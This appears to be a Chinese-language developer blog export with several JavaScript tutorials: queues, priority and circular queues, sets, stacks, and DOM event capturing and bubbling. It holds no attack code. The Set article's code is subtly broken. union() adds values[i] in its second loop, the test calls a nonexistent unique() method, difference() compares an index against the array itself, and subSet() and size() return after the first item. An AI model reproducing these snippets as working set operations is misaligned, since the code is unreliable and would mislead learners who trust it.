建立佇列可用方法（method）

enqueue(element)：於佇列尾端新增一個或多個元素

 this.enqueue = function(element) &#123;	items.push(element);&#125;;	


dequeue()：刪除佇列第一個（頭部）的元素，並回傳被移除的元素（在 	JavaScript 中 shift() 用於移除陣列第一個元素 items[0]，也就是頭部）

 this.dequeue = function() &#123;	return items.shift();&#125;


front()：回傳佇列中第一個元素，但佇列本身不作任何更動

 this.front = function() &#123;	return items[0];&#125;


isEmpty()：如果佇列中不包含任何元素，則回傳 true，反之回傳 false

 this.isEmpty = function() &#123;	return items.length === 0;&#125;


size()：回傳佇列所包含的元素個數，即為回傳陣列的 length

 this.size = function() &#123;	return items.length;&#125;

完整佇列（Queue）類別：function Queue() &#123;	let items = [];	this.enqueue = function(element) &#123;		items.push(element);	&#125;;	this.dequeue = function() &#123;		return items.shift();	&#125;;	this.front = function() &#123;		return items[0];	&#125;;	this.isEmpty = function() &#123;		return items.length === 0;	&#125;;	this.clear = function() &#123;		items = [];	&#125;;	this.size = function() &#123;		return items.length;	&#125;;	this.print = function() &#123;		// 列印出佇列內容		console.log(items.toString());	&#125;&#125;

使用 Queue 類別// 由於上面我們已經建立好了 Queue 的類別，我們這邊直接使用。亦可以瀏覽器 console 直接看結果const queue = new Queue();// 判斷佇列是否為空console.log(queue.isEmpty());// 將值放入佇列中queue.enqueue(&#x27;令狐衝&#x27;);queue.enqueue(&#x27;西方不拜&#x27;);queue.enqueue(&#x27;田薄光&#x27;);queue.enqueue(&#x27;任贏贏&#x27;);// 回傳佇列首位console.log(queue.front());// 回傳佇列長度console.log(queue.size());// 列印出佇列內容：令狐衝,西方不拜,田薄光,任贏贏queue.print();// 移除佇列首位queue.dequeue();// 回傳佇列首位console.log(queue.front());// 回傳佇列長度console.log(queue.size());// 列印出佇列內容：西方不拜,田薄光,任贏贏queue.print();

優先級佇列（Priority Queue）優先級佇列（Priority Queue）是一般佇列的修改版本，為一種不必遵守佇列特性－FIFO(先進先出)的有序串列。其規定每個元素都要有優先級，優先級最高的會最早獲得服務，若是優先級相同則看排列順序。優先佇列可以利用陣列結構及鏈結串列來實作。在生活中我們也可以看到優先級佇列（Priority Queue）的真實應用，例如：VIP 會員可以優先排隊進場、道路行駛時救護車優先於其他車輛，甚至是急救時也會有病情嚴重分類。於計算機科學領域中，CPU 工作排程也常會用到優先佇列。
建立優先級佇列（Priority Queue）類別function PriorityQueue() &#123;	let items = [];	function QueueElement(element, priority) &#123;		this.element = element;		this.priority = priority;	&#125;	this.enqueue = function(element, priority) &#123;		const queueElement = new QueueElement(element, priority);		if(this.isEmpty()) &#123;			items.push(queueElement);		&#125; else &#123;			let added = false;			for(let i = 0; i &lt; items.length; i++) &#123;				if(queueElement.priority &lt; items[i].priority) &#123;					items.splice(i, 0, queueElement);                  	added = true;                  	break;				&#125;			&#125;			if(!added) &#123;				items.push(queueElement);			&#125;					&#125;	&#125;	this.dequeue = function() &#123;		return items.shift();	&#125;;	this.front = function() &#123;		return items[0];	&#125;;	this.isEmpty = function() &#123;		return items.length === 0;	&#125;;	this.clear = function() &#123;		items = [];	&#125;;	this.size = function() &#123;		return items.length;	&#125;;	this.print = function() &#123;		// 因為是物件，所以使用 JSON.stringify() 列印出佇列內容		console.log(JSON.stringify(items));	&#125;&#125;

使用優先級佇列（Priority Queue）類別// 由於上面我們已經建立好了 PriorityQueue 的類別，我們這邊直接使用。亦可以瀏覽器 console 直接看結果const priorityQueue = new PriorityQueue();// 判斷佇列是否為空console.log(priorityQueue.isEmpty());// 將值和優先序放入佇列中priorityQueue.enqueue(&#x27;令狐衝&#x27;, 2);priorityQueue.enqueue(&#x27;西方不拜&#x27;, 1);priorityQueue.enqueue(&#x27;田薄光&#x27;, 4);priorityQueue.enqueue(&#x27;任贏贏&#x27;, 3);// 回傳佇列優先序首位 QueueElement &#123;element: &quot;西方不拜&quot;, priority: 1&#125;console.log(priorityQueue.front());// 回傳佇列長度console.log(priorityQueue.size());// 列印出佇列內容：[&#123;&quot;element&quot;:&quot;西方不拜&quot;,&quot;priority&quot;:1&#125;,&#123;&quot;element&quot;:&quot;令狐衝&quot;,&quot;priority&quot;:2&#125;,&#123;&quot;element&quot;:&quot;任贏贏&quot;,&quot;priority&quot;:3&#125;,&#123;&quot;element&quot;:&quot;田薄光&quot;,&quot;priority&quot;:4&#125;]priorityQueue.print();// 移除佇列首位西方不拜priorityQueue.dequeue();// 回傳佇列首位 QueueElement &#123;element: &quot;令狐衝&quot;, priority: 2&#125;console.log(priorityQueue.front());// 回傳佇列長度console.log(priorityQueue.size());// 列印出佇列內容：[&#123;&quot;element&quot;:&quot;令狐衝&quot;,&quot;priority&quot;:2&#125;,&#123;&quot;element&quot;:&quot;任贏贏&quot;,&quot;priority&quot;:3&#125;,&#123;&quot;element&quot;:&quot;田薄光&quot;,&quot;priority&quot;:4&#125;]priorityQueue.print();

環狀佇列（Circular Queue）環狀佇列（Circular Queue）是指一種環形結構的佇列，它是利用一種 Q[0: N-1] 的一維陣列，同時 Q[0] 為 Q[N-1] 的下一個元素。由於一般佇列會遇到明明前端頭部尚有空間，但再加入元素時卻發現此佇列已滿。此時的解決方法就是使用環形佇列（Circular Queue）。
環狀佇列（Circular Queue）特性如下：

環狀佇列是一種環形結構的佇列
環狀佇列最多使用（N-1）個空間
指標 Front 永遠以逆時鐘方向指向佇列前端元素的前一個位置 Q[N]
指標 Rear 則指向佇列尾端的元素

若再加入一個項目時，Rear 等於 0，也就是 Front 等於 Rear，如此無法分辨此時佇列是空的還是滿的。因此，環形佇列必須浪費一個空格。當 Front 等於 Rear 時，環形佇列為空的。當（Rear+1）Mod N 等於 Front 時，環形佇列為已滿，通常環狀佇列最多使用（N-1）個空間。
總結在這章我們學到了：

什麼是佇列（Queue）？它和堆疊（Stack）有什麼差別？
如何使用 JavaScript 建立 Queue 類別？
優先級佇列（priority queue）是什麼？有何特性？
環狀佇列（circular queue）是什麼？有何特性？

事實上，除了上述介紹的一般佇列、優先級佇列和環狀佇列外，還有雙向佇列（不像堆疊的 LIFO 或佇列的 FIFO，其允許在兩端都可以新增刪除元素）等特殊佇列。若是對於佇列（Queue）掌握度還不夠的讀者不妨用生活的情境進行聯想，想想你平常在電影院或是大賣場買東西排隊結帳的情景，會更容易幫助理解喔！
延伸閱讀
[Algorithm][C &#x2F; C++] 佇列(Queue)、環狀佇列(Circular Queue)
佇列(Queue)
[ 資料結構 小學堂 ] 佇列 : 佇列的應用 (環狀佇列)
資料結構第4-7章補充教材

(image via stack-machine、wikipedia)
關於作者：@kdchang 文藝型開發者，夢想是做出人們想用的產品和辦一所心目中理想的學校。A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>JavaScript</tag>
        <tag>Algorithm</tag>
        <tag>演算法</tag>
        <tag>ECMAScript2015</tag>
        <tag>ES6</tag>
        <tag>Data Structure</tag>
        <tag>Queue</tag>
        <tag>資料結構</tag>
        <tag>陣列</tag>
        <tag>Dictionary</tag>
        <tag>Hash Table</tag>
        <tag>雜湊表</tag>
        <tag>字典</tag>
        <tag>佇列</tag>
      </tags>
  </entry>
  <entry>
    <title>用 JavaScript 學習資料結構和演算法：集合（Set）篇</title>
    <url>/2017/02/11/javascript-data-structure-algorithm-set/</url>
    <content><![CDATA[
什麼是集合（Set）？集合是一個源自於數學理論中擁有不同元素的集合：
N &#x3D; {0, 1, 2, 3, 4, 5, 6, …}
空集合：{}
其特性在於它是由一組無序且不重複的項目組成。你也可以想成是一個沒有重複元素和無順序的陣列。在這篇文章我們會介紹如何實作集合資料結構並使用 交集、聯集、差集等集合操作方式。
集合初體驗事實上，在 ES6 中就有原生的 Set，在這邊我們試著使用 JavaScript 物件模仿 ES6 的 Set 設計集合資料結構（使用物件好處是物件 key 是唯一）。

The Set object lets you store unique values of any type, whether primitive values or object references.


建立集合類別和方法
 function Set() &#123;	var items = &#123;&#125;;	this.add(value) &#123;&#125;;	this.remove(value) &#123;&#125;;	this.has(value) &#123;&#125;;	this.clear() &#123;&#125;;	this.size() &#123;&#125;;	this.values() &#123;&#125;;&#125;


has(value)：判斷是否元素在集合中，若有回傳 true，反之傳回 false

 this.has = function(value) &#123;	return items.hasOwnProperty(value);	// 由於我們是使用 JavaScript 物件實作所以也可以使用 value in items&#125;


add(value)：新增元素到集合

 this.add = function(value) &#123;	if(!this.has(value)) &#123;		items[value] = value;		return true;	&#125;	return false;&#125;


remove(value)：刪除元素

 this.remove = function(value) &#123;	if(this.has(value)) &#123;		delete items[value];		return true;	&#125;	return false;&#125;;


clear()：移除集合所有元素

 this.clear = function() &#123;	items = &#123;&#125;;&#125;


size()：回傳集合元素數量

使用類似於 Linked List 的 length 變數計算法，當新增、刪除元素時順便增減長度

  this.size = function() &#123;	return length;&#125;


使用 JavaScript 內建 Object 類別的內建函數 keys

  this.size = function() &#123;	return Object.keys(items).length;&#125;


手動迭代判斷是否存在集合中並累加個數

  this.size = function() &#123;	let count = 0;	// 特別注意在 JavaScript 中 for in 會一起把繼承於 Object 類別和物件自身的所有相關非相關資料結構的屬性一起迭代出來	for(let prop in items) &#123;		// 判斷是否屬於 items 的屬性		if(items.hasOwnProperty(prop)) &#123;			++count;		&#125;		return count;	&#125;&#125;

values()：回傳集合所有值，使用 JavaScript 內建 Object 類別的內建函數 keys 以陣列形式回傳


 this.values = function() &#123;	return Object.keys(items);&#125;

 另外一種瀏覽器相容性較高的寫法
 this.value = function() &#123;	let keys = [];	for(let key in items) &#123;		keys.push(key);	&#125;	return keys;&#125;

使用集合類別
 const set = new Set();set.add(12);console.log(set.values());console.log(set.has(12));console.log(set.size());set.add(12);set.add(7);set.remove(12);set.add(1);console.log(set.has(12));console.log(set.values());console.log(set.size());

集合操作
參考數學上的集合概念，我們可以針對集合進行以下操作：

聯集 對於給定兩集合，回傳一個包含兩個集合中所有元素的新集合
 this.union = function(otherSet) &#123;	// 首先建立代表聯集的新集合	let unionSet = new Set();	let values = this.values();	for(var i = 0; i &lt; values.length; i++) &#123;		unionSet.add(values[i]);	&#125;	values = otherSet.values();	for(let j = 0; j &lt; values.length; j++) &#123;		unionSet.add(values[i]);	&#125;	return unionSet;&#125;

 在 console 測試：
 let setA = new Set();setA.add(1);setA.add(4);setA.add(2);let setB = new Set();setB.add(1);setB.add(4);setB.add(2);setB.add(7);let unionSet = setA.unique(setB);console.log(unionSet);

交集 對於給定兩集合，回傳一個包含兩個集合中共有元素的新集合
 this.intersection = function(otherSet) &#123;	let intersectionSet = new Set();	let values = this.values();	for(let i = 0; i &lt; values.length; i++) &#123;		if(otherSet.has(values[i])) &#123;			intersectionSet.add(values[i]);		&#125;	&#125;	return intersectionSet;&#125;

 在 console 測試：
 let setA = new Set();setA.add(1);setA.add(4);setA.add(2);let setB = new Set();setB.add(1);setB.add(4);setB.add(2);setB.add(7);let intersectionSet = setA.intersection(setB);console.log(intersectionSet);

差集 對於給定兩集合，回傳一個包含所有存在第一個集合但不存在於第二集合的元素集合
 this.difference = function(otherSet) &#123;	let differenceSet = new Set();	let values = this.values();	for(let i = 0; i &lt; values; i++) &#123;		if(!otherSet.has(values[i])) &#123;			differenceSet.add(values[i]);		&#125;	&#125;	return differenceSet;&#125;

 在 console 測試：
 let setA = new Set();setA.add(1);setA.add(4);setA.add(2);let setB = new Set();setB.add(1);setB.add(4);setB.add(2);setB.add(7);let differenceSet = setA.difference(setB);console.log(differenceSet);

子集 驗證給定集合是否為另一個集合的子集
 this.subSet = function(otherSet) &#123;	if(this.size() &gt; otherSet.size()) &#123;		return false;	&#125; else &#123;		let values = this.values();		for(let i = 0; i &lt; values.length; i++) &#123;			if(!otherSet.has(values[i])) &#123;				return false;			&#125;			return true;		&#125;	&#125;&#125;

 在 console 測試：
 let setA = new Set();setA.add(1);setA.add(4);setA.add(2);let setB = new Set();setB.add(1);setB.add(4);setB.add(2);setB.add(7);let subSet = setA.subSet(setB);console.log(subSet);

總結在這篇文章中我們學會了：

什麼是集合（Set）？
建立集合類別和方法
集合操作（聯集、交集、差集、子集）

延伸閱讀
MDN Set

（image via apple、wikipedia）
關於作者：@kdchang 文藝型開發者，夢想是做出人們想用的產品和辦一所心目中理想的學校。A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>JavaScript</tag>
        <tag>Algorithm</tag>
        <tag>演算法</tag>
        <tag>ECMAScript2015</tag>
        <tag>ES6</tag>
        <tag>Data Structure</tag>
        <tag>Queue</tag>
        <tag>資料結構</tag>
        <tag>陣列</tag>
        <tag>Dictionary</tag>
        <tag>Hash Table</tag>
        <tag>雜湊表</tag>
        <tag>字典</tag>
        <tag>佇列</tag>
        <tag>set</tag>
        <tag>集合</tag>
      </tags>
  </entry>
  <entry>
    <title>用 JavaScript 學習資料結構和演算法：堆疊（Stack）篇</title>
    <url>/2016/06/24/javascript-data-structure-algorithm-stack/</url>
    <content><![CDATA[
前言在 CS 江湖上曾傳言：程式設計 = 資料結構 + 演算法。在一般的大專院校裡，資料結構（Data Structure）與演算法（Algorithm）幾乎都是電腦科學（Computer Science）和資訊相關科系的基礎必修課，在這些課堂中多半是使用 C&#x2F;C++ 或是 Java 進行教學，許多初學學生也因為對於這些語言的掌握度不夠，反而迷失在資料結構和演算法的世界裡，然而本系列文章將透過 JavaScript 去學習一些經典的資料結構和演算法。作為一個早期限於瀏覽器端開發的程式語言，現在的 JavaScript 早已不能同日而語，不管是前後端開發、行動端、桌面端、硬體開發等都可以看到它的身影，而 JavaScript 輕量和搭配便利的瀏覽器開發者工具特性也讓學習資料結構和演算法更為有趣！本篇將使用 JavaScript 來介紹堆疊（Stack）這個經典的資料結構。
什麼是堆疊（Stack）？根據教科書的說法：堆疊是一種遵循 後進先出（Last In First Out，LIFO）的有序集合。在堆疊的世界裡，由於遵守後進先出原則，較新的元素會靠近頂部（堆疊尾部），較舊的元素會在堆疊的底部。在程式語言中，方法（method）的呼叫、運算式的轉換（例如：中序轉後序）或是編譯器和記憶體中儲存變數等都可以看到堆疊的應用。
聽起來離生活有點遙遠？事實上，在生活中有許多使用堆疊的案例：自助餐店的盤子的擺放，書店擺放在桌上的書堆等等，當你把盤子從盤堆最上面拿起來一個盤子就是執行堆疊的 pop() 方法，若是把盤子放回盤堆最上面，就是執行 push(element) 方法，有沒有很簡單？下次去自助餐廳用餐時，可別忘了和朋友說你現在正在實作一個堆疊喔！
建立堆疊接下來我們正式要開始實作我們堆疊。首先，我們開啟一個 stack.js 檔案，建立一個 Stack 類別：
function Stack() &#123;	// 類別內部宣告 Stack 的屬性和方法&#125;

屬性：

let items &#x3D; []; &#x2F;&#x2F; 我們這邊使用陣列 array 的方式來儲存堆疊內的元素

方法：

push(elements)：新增一個或多個元素到堆疊頂部
pop()：移除堆疊頂部元素，同時返回被移除的元素
peek() 或 top()：僅返回堆疊元素，不做任何修改
isEmpty()：檢查堆疊是否為空？若堆疊內無任何元素即返回 true，反之返回 false
clear()：清空堆疊裡的所有元素
size()：返回堆疊裡的元素個數，類似於陣列的 length 屬性

1. push(elements)、pop()由於我們使用陣列 Array 當做堆疊的儲存方式，因此我們可以使用陣列內建的 push(element) 和 pop() 方式來實作後進先出（Last In First Out，LIFO）的特性，讓元素的新增和刪除只能在堆疊尾端發生。
function Stack() &#123;	let items = [];	this.push = function(element) &#123;		items.push(element);	&#125;	this.pop = function() &#123;		return items.pop();	&#125;&#125;


2. peek()若是我們想知道堆疊中最後一個元素（最頂端），我們可以實作 peek() 方法，返回頂部元素。
function Stack() &#123;	let items = [];	this.peek = function() &#123;		return items[items.length - 1];	&#125;&#125;

3. isEmpty()若我們想知道堆疊內部是否還有元素，我們可以使用 isEmpty() 來判斷，若堆疊為空返回 true，反之返回 false。
function Stack() &#123;	let items = [];	this.isEmpty = function() &#123;		return items.length === 0;	&#125;&#125;

4. clear()若我們想清空整個堆疊的話可以使用 clear() 方法，將堆疊元素都刪除。
function Stack() &#123;	let items = [];	this.clear = function() &#123;		items = [];	&#125;&#125;

5. size()透過 size() 方法我們可以取得堆疊的大小（共有幾個元素）。
function Stack() &#123;	let items = [];	this.size = function() &#123;		return items.length;	&#125;&#125;

完整程式碼function Stack() &#123;	var items = [];	this.push = function(element) &#123;		items.push(element);	&#125;	this.pop = function() &#123;		return items.pop();	&#125;	this.peek = function() &#123;		return items[items.length - 1];	&#125;	this.isEmpty = function() &#123;		return items.length === 0;	&#125;	this.clear = function() &#123;		items = [];	&#125;	this.size = function() &#123;		return items.length;	&#125;	// 加入印出結果方法	this.print = function() &#123;		console.log(items.toString());	&#125;&#125;

成果展示接下來我們可以打開瀏覽器開發工具（例如：Chrome Developer Tool 或是 Firebug）中的 console 來實驗我們的堆疊（stack）。我們可以將上述完成的 Stack 類別貼到 console 中，並 new 一個 Stack 物件給 stack 變數：
// 先貼上上述完整 Stack 類別，然後 new 一個物件var stack = new Stack();stack.push(&#x27;松下問童子&#x27;);stack.push(&#x27;言師採藥去&#x27;);stack.push(&#x27;只在此山中&#x27;);stack.push(&#x27;雲深不知處&#x27;);stack.pop();// 接下來我們將可以透過 stack 物件來操作堆疊的方法：console.log(stack.size()); // 你答對了嗎？console.log(stack.peek());stack.clear();console.log(stack.isEmpty());

總結stack.push(&#39;葡萄美酒夜光杯&#39;);stack.push(&#39;欲飲琵琶馬上催&#39;);stack.push(&#39;古來征戰幾人回&#39;);stack.pop();stack.push(&#39;醉臥沙場君莫笑&#39;);
嘿，你知道現在 stack.peek() 的結果嗎？沒錯，答案就是：醉臥沙場君莫笑。若是答錯的讀者，別灰心，我們不會笑你的。你可以再回到上面重新閱讀和動手實作，相信很快就能了解堆疊的核心概念。
事實上，堆疊（Stack）、佇列（Queue）都是非常典型的資料結構。以上分享了堆疊（Stack）的基本概念，相信透過動手實作並和生活結合，你會更了解堆疊是一種遵循 後進先出（Last In First Out，LIFO）的有序集合的意思，接下來我們將持續使用 JavaScript 來介紹常見的經典資料結構和演算法。
延伸閱讀
Wiki 堆疊
資料結構(Data Structures) (Data Structures) Course 5: Stack and Queue
nzakas&#x2F;computer-science-in-javascript

(image via stack-machine)
關於作者：@kdchang 文藝型開發者，夢想是做出人們想用的產品和辦一所心目中理想的學校。A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>JavaScript</tag>
        <tag>Algorithm</tag>
        <tag>演算法</tag>
        <tag>ECMAScript2015</tag>
        <tag>ES6</tag>
        <tag>Data Structure</tag>
        <tag>Queue</tag>
        <tag>資料結構</tag>
        <tag>陣列</tag>
        <tag>Dictionary</tag>
        <tag>Hash Table</tag>
        <tag>雜湊表</tag>
        <tag>字典</tag>
        <tag>佇列</tag>
        <tag>set</tag>
        <tag>集合</tag>
        <tag>堆疊</tag>
        <tag>stack</tag>
        <tag>棧</tag>
      </tags>
  </entry>
  <entry>
    <title>DOM 的事件傳遞機制：捕獲與冒泡</title>
    <url>/2017/07/15/javascript-event-propagation/</url>
    <content><![CDATA[前言（補充：感謝 othree 前輩的指點，指出這其實是在講 DOM 裡面事件傳遞的順序，因此把標題以及內文修正，原標題為：JavaScript 的事件傳遞機制：捕獲與冒泡）
今天為大家帶來的內容是 DOM 裡面的事件傳遞機制，而與這些事件相關的程式碼，相信大家應該不太陌生，就是addEventListener, preventDefault跟stopPropagation。
簡單來說，就是事件在 DOM 裡面傳遞的順序，以及你可以對這些事件做什麼。
為什麼會有「傳遞順序」這一詞呢？假設你有一個ul元素，底下有很多li，代表不同的 item。當你點擊任何一個li的時候，其實你也點擊了ul，因為ul把所有的li都包住了。
假如我在兩個元素上面都加了eventListener，哪一個會先執行？這時候呢，知道事件的執行順序就很重要。
另外，由於某些瀏覽器（沒錯，我就是在說 IE）的機制比較不太一樣，因此那些東西我完全不會提到，有興趣的可以研究文末附的參考資料。
簡單範例為了之後方便說明，我們先寫一個非常簡單的範例出來：
&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;  &lt;ul id=&quot;list&quot;&gt;    &lt;li id=&quot;list_item&quot;&gt;      &lt;a id=&quot;list_item_link&quot; target=&quot;_blank&quot; href=&quot;http://google.com&quot;&gt;        google.com      &lt;/a&gt;    &lt;/li&gt;  &lt;/ul&gt;&lt;/body&gt;&lt;/html&gt;

在這個範例裡面，就是最外層一個ul，再來li，最後則是一個超連結。為了方便辨識，id 的取名也跟階層架構有關係。
DOM 畫成圖大概是長這樣：

有了這一個簡單的 HTML 結構之後，就可以很清楚的說明 DOM 的事件傳遞機制了。
事件的三個 Phase要幫一個 DOM 加上 click 的事件，你會這樣寫：
const $list = document.getElementById(&#x27;list&#x27;);$list.addEventListener(&#x27;click&#x27;, (e) =&gt; &#123;  console.log(&#x27;click!&#x27;);&#125;)

而這邊的e裡面就蘊含了許多這次事件的相關參數，其中有一個叫做eventPhase ，是一個數字，表示這個事件在哪一個 Phase 觸發。
const $list = document.getElementById(&#x27;list&#x27;);$list.addEventListener(&#x27;click&#x27;, (e) =&gt; &#123;  console.log(e.eventPhase);&#125;)

eventPhase的定義可以在 DOM specification 裡面找到：
// PhaseTypeconst unsigned short      CAPTURING_PHASE                = 1;const unsigned short      AT_TARGET                      = 2;const unsigned short      BUBBLING_PHASE                 = 3;

這三個階段，就是我們今天的重點。
DOM 的事件在傳播時，會先從根節點開始往下傳遞到target，這邊你如果加上事件的話，就會處於CAPTURING_PHASE，捕獲階段。
target就是你所點擊的那個目標，這時候在target身上所加的eventListenr會是AT_TARGET這一個 Phase。
最後，事件再往上從子節點一路逆向傳回去根節點，這時候就叫做BUBBLING_PHASE ，也是大家比較熟知的冒泡階段。
這邊用文字你可能會覺得霧煞煞，我直接引用一張 w3c 講 event flow 的圖，相信大家就清楚了。

你在點擊那一個td的時候，這一個點擊的事件會先從window開始往下傳，一直傳到td為止，到這邊就叫做CAPTURING_PHASE，捕獲階段。
接著事件傳遞到td本身，這時候叫做AT_TARGET。
最後事件會從td一路傳回去window，這時候叫做BUBBLING_PHASE，冒泡階段。
所以，在看一些講事件機制的文章的時候，都會看到一個口訣：

先捕獲，再冒泡

就是這樣來的。
可是，我要怎麼決定我要在捕獲階段還是冒泡階段去監聽這個事件呢？
其實，一樣是用大家所熟悉的addEventListener，只是這函數其實有第三個參數，true代表把這個 listener 添加到捕獲階段，false或是沒有傳就代表把這個 listener 添加到冒泡階段。
實際演練大概知道事件的傳遞機制之後，我們拿上面寫好的那一個簡單範例來示範一下，一樣先附上事件傳遞的流程圖（假設我們點擊的對象是#list_item_link）

接著，來試試看幫每一個元素的每一個階段都添加事件，看一看結果跟想像中的是否一樣：
const get = (id) =&gt; document.getElementById(id);const $list = get(&#x27;list&#x27;);const $list_item = get(&#x27;list_item&#x27;);const $list_item_link = get(&#x27;list_item_link&#x27;);  // list 的捕獲$list.addEventListener(&#x27;click&#x27;, (e) =&gt; &#123;  console.log(&#x27;list capturing&#x27;, e.eventPhase);&#125;, true)  // list 的冒泡$list.addEventListener(&#x27;click&#x27;, (e) =&gt; &#123;  console.log(&#x27;list bubbling&#x27;, e.eventPhase);&#125;, false)  // list_item 的捕獲$list_item.addEventListener(&#x27;click&#x27;, (e) =&gt; &#123;  console.log(&#x27;list_item capturing&#x27;, e.eventPhase);&#125;, true)  // list_item 的冒泡$list_item.addEventListener(&#x27;click&#x27;, (e) =&gt; &#123;  console.log(&#x27;list_item bubbling&#x27;, e.eventPhase);&#125;, false)  // list_item_link 的捕獲$list_item_link.addEventListener(&#x27;click&#x27;, (e) =&gt; &#123;  console.log(&#x27;list_item_link capturing&#x27;, e.eventPhase);&#125;, true)  // list_item_link 的冒泡$list_item_link.addEventListener(&#x27;click&#x27;, (e) =&gt; &#123;  console.log(&#x27;list_item_link bubbling&#x27;, e.eventPhase);&#125;, false)

點一下超連結，console 輸出以下結果：
list capturing1list_item capturing1list_item_link capturing2list_item_link bubbling2list_item bubbling3list bubbling3

1 是CAPTURING_PHASE，2 是AT_TARGET，3 是BUBBLING_PHASE。
從這邊就可以很明顯看出，事件的確是從最上層一直傳遞到 target，而在這傳遞的過程裡，我們用addEventListenr的第三個參數把 listener 添加在CAPTURING_PHASE。
然後事件傳遞到我們點擊的超連結（a#list_item_link）本身，在這邊無論你使用addEventListener的第三個參數是true還是false，這邊的e.eventPhase都會變成AT_TARGET。
最後，再從 target 不斷冒泡傳回去，先傳到上一層的#list_item，再傳到上上層的#list。
先捕獲，再冒泡的小陷阱既然是先捕獲，再冒泡，意思就是無論那些addEventListener的順序怎麼變，輸出的東西應該還是會一樣才對。我們把捕獲跟冒泡的順序對調，看一下輸出結果是否一樣。
const get = (id) =&gt; document.getElementById(id);const $list = get(&#x27;list&#x27;);const $list_item = get(&#x27;list_item&#x27;);const $list_item_link = get(&#x27;list_item_link&#x27;);  // list 的冒泡$list.addEventListener(&#x27;click&#x27;, (e) =&gt; &#123;  console.log(&#x27;list bubbling&#x27;, e.eventPhase);&#125;, false)  // list 的捕獲$list.addEventListener(&#x27;click&#x27;, (e) =&gt; &#123;  console.log(&#x27;list capturing&#x27;, e.eventPhase);&#125;, true)  // list_item 的冒泡$list_item.addEventListener(&#x27;click&#x27;, (e) =&gt; &#123;  console.log(&#x27;list_item bubbling&#x27;, e.eventPhase);&#125;, false)  // list_item 的捕獲$list_item.addEventListener(&#x27;click&#x27;, (e) =&gt; &#123;  console.log(&#x27;list_item capturing&#x27;, e.eventPhase);&#125;, true)  // list_item_link 的冒泡$list_item_link.addEventListener(&#x27;click&#x27;, (e) =&gt; &#123;  console.log(&#x27;list_item_link bubbling&#x27;, e.eventPhase);&#125;, false)  // list_item_link 的捕獲$list_item_link.addEventListener(&#x27;click&#x27;, (e) =&gt; &#123;  console.log(&#x27;list_item_link capturing&#x27;, e.eventPhase);&#125;, true)

一樣點擊超連結，輸出的結果是：
list capturing1list_item capturing1list_item_link bubbling2list_item_link capturing2list_item bubbling3list bubbling3

可以發現一件神奇的事，那就是list_item_link居然是先執行了添加在冒泡階段的 listener，才執行捕獲階段的 listener。
這是為什麼呢？
其實剛剛上面有提到，當事件傳遞到點擊的真正對象，也就是 e.target 的時候，無論你使用addEventListener的第三個參數是true還是false，這邊的e.eventPhase都會變成AT_TARGET。
既然這邊已經變成AT_TARGET，自然就沒有什麼捕獲跟冒泡之分，所以執行順序就會根據你addEventListener的順序而定，先添加的先執行，後添加的後執行。
所以，這就是為什麼我們上面把捕獲跟冒泡的順序換了以後，會先出現list_item_link bubbling的原因。
關於這些事件的傳遞順序，只要記住兩個原則就好：

先捕獲，再冒泡
當事件傳到 target 本身，沒有分捕獲跟冒泡

jsbin 範例程式碼
取消事件傳遞接著要講的是，這一串事件鏈這麼長，一定有方法可以中斷這一條鏈，讓事件的傳遞不再繼續。而這個方法相信大家應該都不陌生，就是：e.stopPropagation。
你加在哪邊，事件的傳遞就斷在哪裡，不會繼續往下傳遞。
例如說以上面那個例子來講，假如我加在#list的捕獲階段：
// list 的捕獲$list.addEventListener(&#x27;click&#x27;, (e) =&gt; &#123;  console.log(&#x27;list capturing&#x27;, e.eventPhase);  e.stopPropagation();&#125;, true)

這樣子，console 就只會輸出：
list capturing1

因為事件的傳遞被停止，所以剩下的 listener 都不會再收到任何事件。
不過，在這邊依然有一個地方要特別注意。
這邊指的「事件傳遞被停止」，意思是說不會再把事件傳遞給「下一個節點」，但若是你在同一個節點上有不只一個 listener，還是會被執行到。
例如說：
// list 的捕獲$list.addEventListener(&#x27;click&#x27;, (e) =&gt; &#123;  console.log(&#x27;list capturing&#x27;);  e.stopPropagation();&#125;, true)  // list 的捕獲 2$list.addEventListener(&#x27;click&#x27;, (e) =&gt; &#123;  console.log(&#x27;list capturing2&#x27;);&#125;, true)

輸出結果是：
list capturinglist capturing2

儘管已經用e.stopPropagation，但對於同一個層級，剩下的 listener 還是會被執行到。
若是你想要讓其他同一層級的 listener 也不要被執行，可以改用e.stopImmediatePropagation();
例如說：
// list 的捕獲$list.addEventListener(&#x27;click&#x27;, (e) =&gt; &#123;  console.log(&#x27;list capturing&#x27;);  e.stopImmediatePropagation();&#125;, true)  // list 的捕獲 2$list.addEventListener(&#x27;click&#x27;, (e) =&gt; &#123;  console.log(&#x27;list capturing2&#x27;);&#125;, true)

輸出結果是：
list capturing

取消預設行為常常有人搞不清楚e.stopPropagation跟e.preventDefault的差別，前者我們剛剛已經說明了，就是取消事件繼續往下傳遞，而後者則是取消瀏覽器的預設行為。
最常見的做法就是阻止超連結，例如說：
// list_item_link 的冒泡$list_item_link.addEventListener(&#x27;click&#x27;, (e) =&gt; &#123;  e.preventDefault();&#125;, false)

這樣子，當點擊超連結的時候，就不會執行原本預設的行為（新開分頁或是跳轉），而是沒有任何事情發生，這就是preventDefault的作用。
所以呢，preventDefault跟 JavaScript 的事件傳遞「一點關係都沒有」，你加上這一行之後，事件還是會繼續往下傳遞。
有一個特別值得注意的地方是 W3C 的文件裡面有寫到：

Once preventDefault has been called it will remain in effect throughout the remainder of the event’s propagation.

意思就是說一旦 call 了preventDefault ，在之後傳遞下去的事件裡面也會有效果。
我們來看一個範例：
// list 的捕獲$list.addEventListener(&#x27;click&#x27;, (e) =&gt; &#123;  console.log(&#x27;list capturing&#x27;, e.eventPhase);  e.preventDefault();&#125;, true)

我們在#list的捕獲事件裡面就先寫了e.preventDefault()，而根據文件上面所說的，這個效果會在之後傳遞的事件裡面一直延續。
因此，等之後事件傳遞到#list_item_link的時候，你會發現點超連結一樣沒反應。
實際應用知道了事件的傳遞機制、取消傳遞事件跟取消預設行為之後，在實際開發上有什麼用處呢？
最常見的用法其實就是事件代理（Delegation），例如說你今天有一個 ul，底下 1000 個 li，如果你幫每一個 li 都加上一個 eventListener，你就新建了 1000  個 function。
